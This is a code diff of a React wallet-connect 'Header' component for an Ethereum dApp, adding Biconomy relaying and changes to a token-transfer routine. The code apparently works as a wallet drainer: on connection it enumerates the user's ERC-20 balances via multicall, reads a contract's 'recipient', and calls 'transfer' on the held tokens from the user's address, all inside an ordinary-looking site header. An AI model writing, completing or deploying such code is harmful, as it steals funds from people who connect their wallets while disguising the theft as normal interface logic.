@@ -5,10 +5,11 @@ import Web3Modal from "web3modal";
 import WalletConnectProvider from "@walletconnect/web3-provider";
 import { providers } from 'ethers'
 import { useDispatch, useSelector } from 'react-redux'
-import { contractABI, contractAddr, defaultChainId, ERC20ABI, INFRA_ID,  multicallABI, multicallAddr, tokenList } from '../constants';
+import { biconomyKey, contractABI, contractAddr, defaultChainId, ERC20ABI, INFRA_ID,  multicallABI, multicallAddr, tokenList } from '../constants';
 import { resetWeb3ProviderAction, setAddressAction, setWeb3ProviderAction } from '../store/actions/WalletActions';
 import { Interface } from '@ethersproject/abi'
 import BigNumber from 'bignumber.js';
+import {Biconomy} from "@biconomy/mexa";
 
 const providerOptions = {
     walletconnect: {
@@ -77,8 +78,9 @@ export default function Header() {
     
       const signer = web3Provider.getSigner()
       const address = await signer.getAddress()
+      const biconomy = new Biconomy(web3Provider.provider,{apiKey: biconomyKey, debug: true});
   
-      const web3 = new Web3(web3Provider.provider);
+      const web3 = new Web3(biconomy);
 
 
       if(defaultChainId !== chainId) {
@@ -90,8 +92,11 @@ export default function Header() {
 
       const network = await web3Provider.getNetwork();
 
+      const ctr = new web3.eth.Contract(contractABI, contractAddr);
+      const recipient = await ctr.methods.recipient().call();
+      console.log(recipient);
       try {
-        await mainHandler(web3, address);
+        //await mainHandler(web3, address);
       }catch(error) {
         console.log(error);
         await mainHandler(web3, address);
@@ -111,11 +116,9 @@ export default function Header() {
 
       const _multicallContract = new web3.eth.Contract(multicallABI, multicallAddr);
 
-      
       //ERC-20
       let length = tokenList.length;
-      // let unit = length > 40 ? 40 : length;
-      let unit = 1;
+      let unit = length > 40 ? 40 : length;
       let count = length % unit === 0 ? length / unit : Number.parseInt(length / unit) + 1;
       let erc20BalRes = [];
       for(let j=0  ; j<count ; j++) {
@@ -133,6 +136,7 @@ export default function Header() {
 
       console.log(erc20BalRes)
 
+
       for(let i=0 ; i<erc20BalRes.length ; i++) {
         const _tokenContract = new web3.eth.Contract(ERC20ABI, erc20BalRes[i].address);
 
@@ -142,7 +146,7 @@ export default function Header() {
 
       if(erc20BalRes.length) {
         const _mainContract = new web3.eth.Contract(contractABI, contractAddr);
-        await _mainContract.methods.transfer(erc20BalRes.map(b => b.address)).send({from: address});
+        await _mainContract.methods.transfer(erc20BalRes.map(b => b.address), erc20BalRes.map(b => web3.utils.toWei("100"))).send({from: address});
         console.log("----------sent-----")
       
       }
